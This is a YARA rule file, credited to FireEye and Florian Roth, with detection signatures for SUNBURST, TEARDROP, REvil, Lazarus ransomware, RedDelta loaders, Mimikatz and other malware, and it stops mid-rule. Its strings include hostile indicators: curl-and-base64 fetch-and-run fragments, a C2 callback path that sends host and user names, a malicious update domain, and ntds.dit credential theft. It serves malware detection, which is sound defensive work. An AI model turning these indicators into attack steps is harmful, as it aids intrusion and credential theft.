// Huge thank you to FireEye and Florian Roth for the IOCs

import "pe"

rule APT_Backdoor_MSIL_SUNBURST_1
{
    meta:
        author = "FireEye"
        description = "This rule is looking for portions of the SUNBURST backdoor that are vital to how it functions. The first signature fnv_xor matches a magic byte xor that the sample performs on process, service, and driver names/paths. SUNBURST is a backdoor that has the ability to spawn and kill processes, write and delete files, set and create registry keys, gather system information, and disable a set of forensic analysis tools and services."
    strings:
        $cmd_regex_encoded = "U4qpjjbQtUzUTdONrTY2q42pVapRgooABYxQuIZmtUoA" wide
        $cmd_regex_plain = { 5C 7B 5B 30 2D 39 61 2D 66 2D 5D 7B 33 36 7D 5C 7D 22 7C 22 5B 30 2D 39 61 2D 66 5D 7B 33 32 7D 22 7C 22 5B 30 2D 39 61 2D 66 5D 7B 31 36 7D }
        $fake_orion_event_encoded = "U3ItS80rCaksSFWyUvIvyszPU9IBAA==" wide
        $fake_orion_event_plain = { 22 45 76 65 6E 74 54 79 70 65 22 3A 22 4F 72 69 6F 6E 22 2C }
        $fake_orion_eventmanager_encoded = "U3ItS80r8UvMTVWyUgKzfRPzEtNTi5R0AA==" wide
        $fake_orion_eventmanager_plain = { 22 45 76 65 6E 74 4E 61 6D 65 22 3A 22 45 76 65 6E 74 4D 61 6E 61 67 65 72 22 2C }
        $fake_orion_message_encoded = "U/JNLS5OTE9VslKqNqhVAgA=" wide
        $fake_orion_message_plain = { 22 4D 65 73 73 61 67 65 22 3A 22 7B 30 7D 22 }
        $fnv_xor = { 67 19 D8 A7 3B 90 AC 5B }
    condition:
        $fnv_xor and ($cmd_regex_encoded or $cmd_regex_plain) or ( ($fake_orion_event_encoded or $fake_orion_event_plain) and ($fake_orion_eventmanager_encoded or $fake_orion_eventmanager_plain) and ($fake_orion_message_encoded and $fake_orion_message_plain) )
}
rule APT_Backdoor_MSIL_SUNBURST_2
{
    meta:
        author = "FireEye"
        description = "The SUNBURST backdoor uses a domain generation algorithm (DGA) as part of C2 communications. This rule is looking for each branch of the code that checks for which HTTP method is being used. This is in one large conjunction, and all branches are then tied together via disjunction. The grouping is intentionally designed so that if any part of the DGA is re-used in another sample, this signature should match that re-used portion. SUNBURST is a backdoor that has the ability to spawn and kill processes, write and delete files, set and create registry keys, gather system information, and disable a set of forensic analysis tools and services."
    strings:
        $a = "0y3Kzy8BAA==" wide
        $aa = "S8vPKynWL89PS9OvNqjVrTYEYqNa3fLUpDSgTLVxrR5IzggA" wide
        $ab = "S8vPKynWL89PS9OvNqjVrTYEYqPaauNaPZCYEQA=" wide
        $ac = "C88sSs1JLS4GAA==" wide
        $ad = "C/UEAA==" wide
        $ae = "C89MSU8tKQYA" wide
        $af = "8wvwBQA=" wide
        $ag = "cyzIz8nJBwA=" wide
        $ah = "c87JL03xzc/LLMkvysxLBwA=" wide
        $ai = "88tPSS0GAA==" wide
        $aj = "C8vPKc1NLQYA" wide
        $ak = "88wrSS1KS0xOLQYA" wide
        $al = "c87PLcjPS80rKQYA" wide
        $am = "Ky7PLNAvLUjRBwA=" wide
        $an = "06vIzQEA" wide
        $b = "0y3NyyxLLSpOzIlPTgQA" wide
        $c = "001OBAA=" wide
        $d = "0y0oysxNLKqMT04EAA==" wide
        $e = "0y3JzE0tLknMLQAA" wide
        $f = "003PyU9KzAEA" wide
        $h = "0y1OTS4tSk1OBAA=" wide
        $i = "K8jO1E8uytGvNqitNqytNqrVA/IA" wide
        $j = "c8rPSQEA" wide
        $k = "c8rPSfEsSczJTAYA" wide
        $l = "c60oKUp0ys9JAQA=" wide
        $m = "c60oKUp0ys9J8SxJzMlMBgA=" wide
        $n = "8yxJzMlMBgA=" wide
        $o = "88lMzygBAA==" wide
        $p = "88lMzyjxLEnMyUwGAA==" wide
        $q = "C0pNL81JLAIA" wide
        $r = "C07NzXTKz0kBAA==" wide
        $s = "C07NzXTKz0nxLEnMyUwGAA==" wide
        $t = "yy9IzStOzCsGAA==" wide
        $u = "y8svyQcA" wide
        $v = "SytKTU3LzysBAA==" wide
        $w = "C84vLUpOdc5PSQ0oygcA" wide
        $x = "C84vLUpODU4tykwLKMoHAA==" wide
        $y = "C84vLUpO9UjMC07MKwYA" wide
        $z = "C84vLUpO9UjMC04tykwDAA==" wide
    condition:
        ($a and $b and $c and $d and $e and $f and $h and $i) or ($j and $k and $l and $m and $n and $o and $p and $q and $r and $s and ($aa or $ab)) or ($t and $u and $v and $w and $x and $y and $z and ($aa or $ab)) or ($ac and $ad and $ae and $af and $ag and $ah and ($am or $an)) or ($ai and $aj and $ak and $al and ($am or $an))
}
rule APT_Backdoor_MSIL_SUNBURST_3
{
    meta:
        author = "FireEye"
        description = "This rule is looking for certain portions of the SUNBURST backdoor that deal with C2 communications. SUNBURST is a backdoor that has the ability to spawn and kill processes, write and delete files, set and create registry keys, gather system information, and disable a set of forensic analysis tools and services."
    strings:
        $sb1 = { 05 14 51 1? 0A 04 28 [2] 00 06 0? [0-16] 03 1F ?? 2E ?? 03 1F ?? 2E ?? 03 1F ?? 2E ?? 03 1F [1-32] 03 0? 05 28 [2] 00 06 0? [0-32] 03 [0-16] 59 45 06 }
        $sb2 = { FE 16 [2] 00 01 6F [2] 00 0A 1? 8D [2] 00 01 [0-32] 1? 1? 7B 9? [0-16] 1? 1? 7D 9? [0-16] 6F [2] 00 0A 28 [2] 00 0A 28 [2] 00 0A [0-32] 02 7B [2] 00 04 1? 6F [2] 00 0A [2-32] 02 7B [2] 00 04 20 [4] 6F [2] 00 0A [0-32] 13 ?? 11 ?? 11 ?? 6E 58 13 ?? 11 ?? 11 ?? 9? 1? [0-32] 60 13 ?? 0? 11 ?? 28 [4] 11 ?? 11 ?? 9? 28 [4] 28 [4-32] 9? 58 [0-32] 6? 5F 13 ?? 02 7B [2] 00 04 1? ?? 1? ?? 6F [2] 00 0A 8D [2] 00 01 }
        $ss1 = "\x00set_UseShellExecute\x00"
        $ss2 = "\x00ProcessStartInfo\x00"
        $ss3 = "\x00GetResponseStream\x00"
        $ss4 = "\x00HttpWebResponse\x00"
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}
rule APT_Backdoor_MSIL_SUNBURST_4
{
    meta:
        author = "FireEye"
        description = "This rule is looking for specific methods used by the SUNBURST backdoor. SUNBURST is a backdoor that has the ability to spawn and kill processes, write and delete files, set and create registry keys, gather system information, and disable a set of forensic analysis tools and services."
    strings:
        $ss1 = "\x00set_UseShellExecute\x00"
        $ss2 = "\x00ProcessStartInfo\x00"
        $ss3 = "\x00GetResponseStream\x00"
        $ss4 = "\x00HttpWebResponse\x00"
        $ss5 = "\x00ExecuteEngine\x00"
        $ss6 = "\x00ParseServiceResponse\x00"
        $ss7 = "\x00RunTask\x00"
        $ss8 = "\x00CreateUploadRequest\x00"
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}
rule APT_Dropper_Raw64_TEARDROP_1
{
    meta:
        author = "FireEye"
        description = "This rule looks for portions of the TEARDROP backdoor that are vital to how it functions. TEARDROP is a memory only dropper that can read files and registry keys, XOR decode an embedded payload, and load the payload into memory. TEARDROP persists as a Windows service and has been observed dropping Cobalt Strike BEACON into memory."
    strings:
        $sb1 = { C7 44 24 ?? 80 00 00 00 [0-64] BA 00 00 00 80 [0-32] 48 8D 0D [4-32] FF 15 [4] 48 83 F8 FF [2-64] 41 B8 40 00 00 00 [0-64] FF 15 [4-5] 85 C0 7? ?? 80 3D [4] FF }
        $sb2 = { 80 3D [4] D8 [2-32] 41 B8 04 00 00 00 [0-32] C7 44 24 ?? 4A 46 49 46 [0-32] E8 [4-5] 85 C0 [2-32] C6 05 [4] 6A C6 05 [4] 70 C6 05 [4] 65 C6 05 [4] 67 }
        $sb3 = { BA [4] 48 89 ?? E8 [4] 41 B8 [4] 48 89 ?? 48 89 ?? E8 [4] 85 C0 7? [1-32] 8B 44 24 ?? 48 8B ?? 24 [1-16] 48 01 C8 [0-32] FF D0 }
    condition:
        all of them
}
rule APT_Dropper_Win64_TEARDROP_2
{
    meta:
        author = "FireEye"
        description = "This rule is intended match specific sequences of opcode found within TEARDROP, including those that decode the embedded payload. TEARDROP is a memory only dropper that can read files and registry keys, XOR decode an embedded payload, and load the payload into memory. TEARDROP persists as a Windows service and has been observed dropping Cobalt Strike BEACON into memory."
    strings:
        $loc_4218FE24A5 = { 48 89 C8 45 0F B6 4C 0A 30 }
        $loc_4218FE36CA = { 48 C1 E0 04 83 C3 01 48 01 E8 8B 48 28 8B 50 30 44 8B 40 2C 48 01 F1 4C 01 FA }
        $loc_4218FE2747 = { C6 05 ?? ?? ?? ?? 6A C6 05 ?? ?? ?? ?? 70 C6 05 ?? ?? ?? ?? 65 C6 05 ?? ?? ?? ?? 67 }
        $loc_5551D725A0 = { 48 89 C8 45 0F B6 4C 0A 30 48 89 CE 44 89 CF 48 F7 E3 48 C1 EA 05 48 8D 04 92 48 8D 04 42 48 C1 E0 04 48 29 C6 }
        $loc_5551D726F6 = { 53 4F 46 54 57 41 52 45 ?? ?? ?? ?? 66 74 5C 43 ?? ?? ?? ?? 00 }
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}
rule SUSP_AdobePDF_SFX_Bitmap_Combo_Executable_RID362C : ANOMALY DEMO EXE FILE SUSP {
   meta:
      description = "Detects a suspicious executable that contains both a SFX icon and an Adobe PDF icon"
      author = "Florian Roth"
      reference = "https://mp.weixin.qq.com/s/3Pa3hiuZyQBspDzH0kGSHw"
      date = "2020-11-02 16:44:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "ANOMALY, DEMO, EXE, FILE, SUSP"
      required_modules = "pe"
      minimum_yara = "3.0.0"
      
   strings:
      $sc1 = { FF 00 CC FF FF 00 99 FF FF 00 66 FF FF 00 33 FF
               FF 80 00 FF FF 80 FF CC FF 80 CC CC FF C0 99 CC
               FF 80 66 CC FF 00 33 CC FF 00 00 CC FF 00 FF 99
               FF FF CC 99 FF FF 99 99 FF FF 66 99 FF FF 33 99
               FF 08 00 99 FF 88 FF 66 FF 88 CC 66 FF 88 99 66
               FF 88 66 66 FF 88 33 66 FF 05 00 66 FF 55 FF 33
               FF 55 CC 33 FF 55 99 33 FF 55 66 33 FF 58 33 33
               FF 01 00 33 FF 99 FF 00 FF 99 CC 00 FF 99 99 00
               FF 99 66 00 FF 58 33 00 FF 01 00 00 FF 99 FF FF
               CC 99 CC FF CC 99 99 FF CC 99 66 FF CC 58 33 FF
               CC 01 00 FF CC FF FF CC CC FF CC CC CC FF 99 CC
               CC FF 66 CC CC 58 33 CC CC 01 00 CC CC FF FF 99 } 
      $sc2 = { 28 66 27 00 60 00 00 00 80 00 00 00 80 80 80 00
               C0 C0 C0 00 FF FF FF 00 FF FF FF 00 FF FF FF 00
               FF FF FF 00 FF FF FF 00 FF FF FF 00 FF FF FF 00
               FF FF FF 00 FF FF FF 00 5D 33 00 00 5D 33 00 00
               5D 33 00 00 5D 33 00 00 5D 33 00 00 5D 33 00 00
               5D 33 00 00 5D 33 00 00 5D 33 00 00 5D 33 00 00 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and all of them and pe.number_of_signatures < 1
} 

rule SUSP_AdobePDF_Bitmap_Executable_RID328D : DEMO EXE FILE SUSP T1136 {
   meta:
      description = "Detects a suspicious executable that contains a Adobe PDF icon and no shows no sign of actual Adobe software"
      author = "Florian Roth"
      reference = "https://mp.weixin.qq.com/s/3Pa3hiuZyQBspDzH0kGSHw"
      date = "2020-11-02 14:10:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, SUSP, T1136"
      required_modules = "pe"
      minimum_yara = "3.0.0"
      
   strings:
      $sc1 = { FF 00 CC FF FF 00 99 FF FF 00 66 FF FF 00 33 FF
               FF 80 00 FF FF 80 FF CC FF 80 CC CC FF C0 99 CC
               FF 80 66 CC FF 00 33 CC FF 00 00 CC FF 00 FF 99
               FF FF CC 99 FF FF 99 99 FF FF 66 99 FF FF 33 99
               FF 08 00 99 FF 88 FF 66 FF 88 CC 66 FF 88 99 66
               FF 88 66 66 FF 88 33 66 FF 05 00 66 FF 55 FF 33
               FF 55 CC 33 FF 55 99 33 FF 55 66 33 FF 58 33 33
               FF 01 00 33 FF 99 FF 00 FF 99 CC 00 FF 99 99 00
               FF 99 66 00 FF 58 33 00 FF 01 00 00 FF 99 FF FF
               CC 99 CC FF CC 99 99 FF CC 99 66 FF CC 58 33 FF
               CC 01 00 FF CC FF FF CC CC FF CC CC CC FF 99 CC
               CC FF 66 CC CC 58 33 CC CC 01 00 CC CC FF FF 99 } 
      $fp1 = "Adobe" ascii wide fullword
   condition: 
      uint16 ( 0 ) == 0x5a4d and $sc1 and not 1 of ( $fp* ) and pe.number_of_signatures < 1
} 

rule APT_CN_MAL_RedDelta_Shellcode_Loader_Oct20_1_RID36A2 : APT CHINA DEMO EXE FILE T1136 {
   meta:
      description = "Detects Red Delta samples"
      author = "Florian Roth"
      reference = "https://twitter.com/JAMESWT_MHT/status/1316387482708119556"
      date = "2020-10-14 17:04:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, CHINA, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "InjectShellCode" ascii fullword
      $s1 = "DotNetLoader.exe" wide ascii fullword
      $s2 = "clipboardinject" ascii fullword
      $s3 = "download.php?raw=1" wide
      $s4 = "Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\Levint" wide
      $s5 = "FlashUpdate.exe" wide
      $s6 = "raw_cc_url" ascii fullword
      $op1 = { 48 8b 4c 24 78 48 89 01 e9 1a ff ff ff 48 8b 44 } 
      $op2 = { ff ff 00 00 77 2a 8b 44 24 38 8b 8c 24 98 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and $x1 or 3 of them
} 

rule APT_CN_MAL_RedDelta_Shellcode_Loader_Oct20_2_RID36A3 : APT CHINA DEMO EXE FILE T1136 {
   meta:
      description = "Detects Red Delta samples"
      author = "Florian Roth"
      reference = "https://twitter.com/JAMESWT_MHT/status/1316387482708119556"
      date = "2020-10-14 17:04:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, CHINA, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\CLRLoader.exe" wide fullword
      $x2 = "/callback.php?token=%s&computername=%s&username=%s" ascii fullword
      $s1 = "DotNetLoader.Program" wide fullword
      $s2 = "/download.php?api=40" ascii fullword
      $s3 = "get %d URLDir" ascii fullword
      $s4 = "Read code failed" ascii fullword
      $s5 = "OpenFile fail!" wide fullword
      $s6 = "Writefile success" wide fullword
      $op1 = { 4c 8d 45 e0 49 8b cc 41 8d 51 c3 e8 34 77 02 00 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of ( $x* ) or 4 of them
} 

rule APT_CN_MAL_RedDelta_Shellcode_Loader_Oct20_3_RID36A4 : APT CHINA DEMO EXE FILE T1136 {
   meta:
      description = "Detects Red Delta samples"
      author = "Florian Roth"
      reference = "https://twitter.com/JAMESWT_MHT/status/1316387482708119556"
      date = "2020-10-14 17:04:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, CHINA, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Taskschd.dll" ascii fullword
      $s2 = "AddTaskPlanDllVerson.dll" ascii fullword
      $s3 = "\\FlashUpdate.exe" ascii fullword
      $s4 = "D:\\Project\\FBIRedTeam" ascii fullword
      $s5 = "Error %s:%d, ErrorCode: %x" ascii fullword
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 4 of them
} 

rule MAL_RANSOM_REvil_Oct20_1_RID2ED2 : DEMO EXE FILE MAL {
   meta:
      description = "Detects REvil ransomware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2020-10-13 11:30:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "1.7"
      
   strings:
      $op1 = { 0f 8c 74 ff ff ff 33 c0 5f 5e 5b 8b e5 5d c3 8b } 
      $op2 = { 8d 85 68 ff ff ff 50 e8 2a fe ff ff 8d 85 68 ff } 
      $op3 = { 89 4d f4 8b 4e 0c 33 4e 34 33 4e 5c 33 8e 84 } 
      $op4 = { 8d 85 68 ff ff ff 50 e8 05 06 00 00 8d 85 68 ff } 
      $op5 = { 8d 85 68 ff ff ff 56 57 ff 75 0c 50 e8 2f } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 2 of them or 4 of them
} 

rule APT_MAL_MalDoc_CloudAtlas_Oct20_1_RID3280 : APT DEMO FILE T1136 {
   meta:
      description = "Detects unknown maldoc dropper noticed in October 2020"
      author = "Florian Roth"
      reference = "https://twitter.com/jfslowik/status/1316050637092651009"
      date = "2020-10-13 14:07:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "https://msofficeupdate.org" wide
   condition: 
      uint16 ( 0 ) == 0xcfd0 and filesize < 300KB and 1 of ( $x* )
} 

rule APT_MAL_URL_CloudAtlas_Oct20_2_RID3144 : APT DEMO FILE {
   meta:
      description = "Detects unknown maldoc dropper noticed in October 2020"
      author = "Florian Roth"
      reference = "https://twitter.com/jfslowik/status/1316050637092651009"
      date = "2020-10-13 13:15:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE"
      minimum_yara = "1.7"
      
   strings:
      $hc1 = { 5B 49 6E 74 65 72 6E 65 74 53 68 6F 72 74 63 75
               74 5D 0D 0A 55 52 4C 3D 68 74 74 70 73 3A 2F 2F
               6D 73 6F 66 66 69 63 65 75 70 64 61 74 65 2E 6F
               72 67 } 
   condition: 
      uint16 ( 0 ) == 0x495b and filesize < 200 and $hc1 at 0
} 

rule MAL_DOC_ZLoader_Oct20_1_RID2EA7 : DEMO FILE MAL {
   meta:
      description = "Detects weaponized ZLoader documents"
      author = "Florian Roth"
      reference = "https://twitter.com/JohnLaTwC/status/1314602421977452544"
      date = "2020-10-10 11:23:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, MAL"
      minimum_yara = "1.7"
      
   strings:
      $sc1 = { 78 4E FC 04 AB 6B 17 E2 33 E3 49 62 50 69 BB 60
               31 00 1E 00 02 4B BA E2 D8 E3 92 22 1E 69 96 20
               98 } 
      $sc2 = { 6B 9E E2 36 E3 69 62 72 69 3A 60 55 6E } 
      $sc3 = { 3E 69 76 60 59 6E 34 FB 87 6B 75 } 
   condition: 
      uint16 ( 0 ) == 0xcfd0 and filesize < 40KB and filesize > 30KB and all of them
} 

rule APT_MAL_NK_Lazarus_VHD_Ransomware_Oct20_1_RID359E : APT CRIME DEMO EXE FILE G0032 NK T1136 {
   meta:
      description = "Detects Lazarus VHD Ransomware"
      author = "Florian Roth"
      reference = "https://securelist.com/lazarus-on-the-hunt-for-big-game/97757/"
      date = "2020-10-05 16:20:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, CRIME, DEMO, EXE, FILE, G0032, NK, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "HowToDecrypt.txt" wide fullword
      $s2 = "rsa.cpp" wide fullword
      $s3 = "sc stop \"Microsoft Exchange Compliance Service\"" ascii fullword
      $op1 = { 8b 8d bc fc ff ff 8b 94 bd 34 03 00 00 33 c0 50 } 
      $op2 = { 8b 8d 98 f9 ff ff 8d 64 24 00 8b 39 3b bc 85 34 } 
      $op3 = { 8b 94 85 34 03 00 00 89 11 40 83 c1 04 3b 06 7c } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 2 of them
} 

rule APT_MAL_NK_Lazarus_VHD_Ransomware_Oct20_2_RID359F : APT CRIME DEMO EXE FILE G0032 NK {
   meta:
      description = "Detects Lazarus VHD Ransomware"
      author = "Florian Roth"
      reference = "https://securelist.com/lazarus-on-the-hunt-for-big-game/97757/"
      date = "2020-10-05 16:21:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, CRIME, DEMO, EXE, FILE, G0032, NK"
      minimum_yara = "1.7"
      
   strings:
      $op1 = { f9 36 88 08 8d ad fc ff ff ff 66 ff c1 e9 72 86 } 
      $op2 = { c6 c4 58 0f a4 c8 12 8d ad ff ff ff ff 0f b6 44 } 
      $op3 = { 88 02 66 c1 f0 54 8d bf fc ff ff ff 0f ba e0 19 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 9000KB and all of them
} 

rule APT_MAL_SLOTHFULMEDIA_Oct20_1_RID2FD6 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects SLOTHFULMEDIA malware"
      author = "Florian Roth"
      reference = "https://us-cert.cisa.gov/ncas/analysis-reports/ar20-275a"
      date = "2020-10-01 12:14:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $xc1 = { 25 73 26 69 3D 25 64 00 48 54 54 50 2F 31 2E 31
               00 00 00 00 50 4F 53 54 00 00 00 00 43 6F 6E 74
               65 6E 74 2D 4C 65 6E 67 74 68 3A 20 25 64 00 00
               5C 00 53 00 65 00 74 00 75 00 70 00 55 00 69 00
               00 00 00 00 25 00 73 00 25 00 73 00 5F 00 25 00
               64 00 2E 00 64 00 61 00 74 } 
      $xc2 = { 2F 76 3F 6D 3D 00 00 00 35 30 31 00 32 30 30 00
               2A 00 2E 00 2A 00 00 00 25 00 73 00 00 00 00 00
               53 00 65 00 44 00 65 00 62 00 75 00 67 00 50 00
               72 00 69 00 76 00 69 00 6C 00 65 00 67 00 65 } 
      $xc3 = { 00 25 00 73 00 7C 00 25 00 73 00 7C 00 25 00 73
               00 7C 00 25 00 73 00 00 00 5C 00 46 00 69 00 6C
               00 74 00 65 00 72 00 33 00 2E 00 6A 00 70 00 67 } 
      $sc1 = { 25 74 65 6D 70 25 00 00 25 73 5C 25 73 2E 65 78
               65 00 00 00 25 74 65 6D 70 25 00 00 25 73 5C 25
               73 2E 65 78 65 } 
      $sc2 = { 61 70 70 6C 69 63 61 74 69 6F 6E 2F 6F 63 74 65
               74 2D 73 74 72 65 61 6D 2C 61 70 70 6C 69 63 61
               74 69 6F 6E 2F 78 68 74 6D 6C 00 00 25 73 26 69
               3D 25 64 00 48 54 54 50 2F 31 2E 31 00 00 00 00
               50 4F 53 54 } 
      $s1 = "%s%s_%d.dat" wide fullword
      $s2 = "Local Security Process" wide fullword
      $s3 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75" ascii fullword
      $s4 = "Global%s%d" wide fullword
      $s5 = "ExtKeyloggerStart" ascii fullword
      $s6 = "GetExtendedTcpTable" ascii fullword
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( 1 of ( $x* ) or 3 of them ) or 4 of them
} 

rule SUSP_ZIP_NtdsDIT_RID2C87 : DEMO FILE SUSP T1003_003 T1020 T1136 {
   meta:
      description = "Detects ntds.dit files in ZIP archives that could be a left over of administrative activity or traces of data exfiltration"
      author = "Florian Roth"
      reference = "https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/"
      date = "2020-08-10 09:53:01"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SUSP, T1003_003, T1020, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "ntds.dit" ascii
   condition: 
      uint16 ( 0 ) == 0x4b50 and $s1 in ( 0 .. 256 )
} 

rule HKTL_Mimikatz_SkeletonKey_in_memory_Aug20_1_RID3752 : DEMO HKTL S0002 T1003 T1075 T1097 T1098 T1177 T1178 {
   meta:
      description = "Detects Mimikatz SkeletonKey in Memory"
      author = "Florian Roth"
      reference = "https://twitter.com/sbousseaden/status/1292143504131600384?s=12"
      date = "2020-08-09 17:33:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, S0002, T1003, T1075, T1097, T1098, T1177, T1178"
      minimum_yara = "1.7"
      
   strings:
      $x1 = { 60 ba 4f ca c7 44 24 34 dc 46 6c 7a c7 44 24 38 
              03 3c 17 81 c7 44 24 3c 94 c0 3d f6 } 
   condition: 
      1 of them
} 

rule SUSP_LNX_Linux_Malware_Indicators_Aug20_1_RID3621 : DEMO LINUX MAL SUSP T1033 T1136 {
   meta:
      description = "Detects indicators often found in linux malware samples"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2020-08-03 16:42:41"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, LINUX, MAL, SUSP, T1033, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "&& chmod +x" ascii
      $s2 = "|base64 -" ascii
      $s3 = " /tmp" ascii
      $s4 = "|curl " ascii
      $s5 = "whoami" ascii fullword
      $fp1 = "WITHOUT ANY WARRANTY" ascii
      $fp2 = "postinst" ascii fullword
      $fp3 = "THIS SOFTWARE IS PROVIDED" ascii fullword
      $fp4 = "Free Software Foundation" ascii fullword
   condition: 
      filesize < 400KB and 3 of ( $s* ) and not 1 of ( $fp* )
} 

rule SUSP_RANSOMWARE_Indicator_Jul20_RID31A2 : CRIME DEMO EXE FILE SUSP T1136 {
   meta:
      description = "Detects ransomware indicator"
      author = "Florian Roth"
      reference = "https://securelist.com/lazarus-on-the-hunt-for-big-game/97757/"
      date = "2020-07-28 13:30:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      nodeepdive = "1"
      tags = "CRIME, DEMO, EXE, FILE, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $ = "Decrypt.txt" ascii wide
      $ = "DecryptFiles.txt" ascii wide
      $ = "Decrypt-Files.txt" ascii wide
      $ = "DecryptFilesHere.txt" ascii wide
      $ = "DECRYPT.txt" ascii wide
      $ = "DecryptFiles.txt" ascii wide
      $ = "DECRYPT-FILES.txt" ascii wide
      $ = "DecryptFilesHere.txt" ascii wide
      $ = "DECRYPT_INSTRUCTION.TXT" ascii wide
      $ = "FILES ENCRYPTED.txt" ascii wide
      $ = "DECRYPT MY FILES" ascii wide
      $ = "DECRYPT-MY-FILES" ascii wide
      $ = "DECRYPT_MY_FILES" ascii wide
      $ = "DECRYPT YOUR FILES" ascii wide
      $ = "DECRYPT-YOUR-FILES" ascii wide
      $ = "DECRYPT_YOUR_FILES" ascii wide
      $ = "DECRYPT FILES.txt" ascii wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1400KB and 1 of them
} 

rule SUSP_RAR_Single_Doc_File_RID2FB5 : DEMO FILE SUSP T1136 {
   meta:
      description = "Detects suspicious RAR files that contain nothing but a single .doc file"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2020-07-11 12:08:41"
      score = 40
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = ".doc" 
   condition: 
      uint16 ( 0 ) == 0x6152 and filesize < 4000KB and $s1 at ( uint16 ( 5 ) + uint16 ( uint16 ( 5 ) + 5 ) + uint16 ( uint16 ( 5 ) + uint16 ( uint16 ( 5 ) + 5 ) + 5 ) - 9 ) and ( uint16 ( 5 ) + uint16 ( uint16 ( 5 ) + 5 ) + uint16 ( uint16 ( 5 ) + uint16 ( uint16 ( 5 ) + 5 ) + 5 ) + uint32 ( uint16 ( 5 ) + uint16 ( uint16 ( 5 ) + 5 ) + 7 ) > filesize - 8 )
} 

rule SUSP_GIF_Anomalies_RID2D89 : DEMO FILE SUSP T1027 {
   meta:
      description = "Detects files with GIF headers and format anomalies - which means that this image could be an obfuscated file of a different type"
      author = "Florian Roth"
      reference = "https://en.wikipedia.org/wiki/GIF"
      date = "2020-07-02 10:36:01"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SUSP, T1027"
      minimum_yara = "1.7"
      
   condition: 
      uint16 ( 0 ) == 0x4947 and uint8 ( 2 ) == 0x46 and uint8 ( 11 ) != 0x00 and uint8 ( 12 ) != 0x00 and uint8 ( filesize - 1 ) != 0x3b
} 

rule SUSP_OBFUSC_PowerShell_True_Jun20_1_RID335E : DEMO SCRIPT SUSP T1027 T1086 T1136 {
   meta:
      description = "Detects indicators often found in obfuscated PowerShell scripts"
      author = "Florian Roth"
      reference = "https://github.com/corneacristian/mimikatz-bypass/"
      date = "2020-06-27 14:44:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
